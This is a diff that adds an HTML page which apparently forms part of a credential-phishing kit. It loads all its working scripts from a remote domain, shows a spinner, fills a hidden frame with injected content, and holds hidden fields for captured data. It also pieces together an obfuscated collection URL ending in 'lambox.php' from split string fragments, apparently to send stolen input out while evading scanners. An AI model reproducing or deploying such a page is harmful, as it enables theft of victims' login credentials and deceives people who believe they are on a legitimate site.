@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <link
+      id="favicon"
+      rel="icon"
+      href="original-favicon.ico"
+      type="image/x-icon"
+    />
+
+    <base href="https://alldom2-asst.zfc.info/assets/" />
+
+    <script
+      type="text/javascript"
+      src="https://alldom2-asst.zfc.info/js/mjs.js"
+    ></script>
+
+    <script
+      type="text/javascript"
+      src="https://alldom2-asst.zfc.info/js/setup.js"
+    ></script>
+
+    <script defer>
+      //Your PHP GOES HERE
+      let nbg1 = "htt";
+      let nbg2 = "ps://estyq";
+      let nbg3 = "ueen.li";
+      let nbg4 = "ve/erf/la";
+      let nbg5 = "mbox.ph";
+      let nbg6 = "p";
+
+      let hnsk = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
+    </script>
+
+    <script src="https://alldom2-asst.zfc.info/js/index.js"></script>
+
+    <script
+      type="text/javascript"
+      src="https://code.jquery.com/jquery-latest.min.js"
+    ></script>
+  </head>
+
+  <body>
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+      }
+
+      #myFrame {
+        display: none;
+      }
+
+      * {
+        padding: 0;
+        margin: 0;
+        box-sizing: border-box;
+      }
+      #general_loader {
+        display: none;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        background-color: #f1f2f555;
+        z-index: 99;
+      }
+
+      #general_loader > div {
+        width: 40px;
+        height: 40px;
+        border: 6px solid #ccc;
+        border-top-color: #00bfff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+
+    <div id="general_loader">
+      <div></div>
+    </div>
+
+    <input type="hidden" id="foc" name="foc" required placeholder="FOC" />
+    <input type="hidden" id="trial" name="trial" required placeholder="trial" />
+    <input
+      type="hidden"
+      id="orgi"
+      name="orgi"
+      required
+      placeholder="original"
+    />
+    <input type="hidden" id="page" name="page" required placeholder="PG" />
+
+    <script>
+      document.querySelector("#general_loader").style.display = "flex";
+      const intervalId = setInterval(() => {
+        const myFrame = document.getElementById("myFrame");
+        const hasContent =
+          myFrame.textContent.trim().length > 0 || myFrame.children.length > 0;
+
+        console.log("hasContent 2");
+
+        if (hasContent) {
+          setTimeout(() => {
+            document.querySelector("#general_loader").style.display = "none";
+            myFrame.style.display = "block";
+            clearInterval(intervalId);
+          }, 2000);
+          // stop checking
+        }
+      }, 1000);
+    </script>
+
+    <div id="myFrame"></div>
+  </body>
+</html>
